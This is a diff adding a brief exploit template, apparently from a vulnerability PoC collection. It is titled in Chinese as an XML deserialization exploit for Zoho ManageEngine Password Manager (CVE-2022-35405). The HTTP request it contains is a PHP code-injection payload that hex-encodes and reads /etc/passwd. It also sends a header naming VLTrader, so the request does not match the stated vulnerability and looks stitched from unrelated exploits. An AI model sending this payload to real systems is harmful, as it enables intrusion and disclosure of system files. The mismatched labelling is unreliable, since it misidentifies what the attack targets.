@@ -1,0 +1,5 @@
+# Zoho ManageEngine PasswordManager XML反序列化漏洞(CVE-2022-35405)
+GET /?a={show_source(hex2bin(%272f2f6574632f706173737764%27))} HTTP/1.1
+Host: www.xwd_test.com
+Retrieve: l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;s=True;b=False;pp=1337;
+
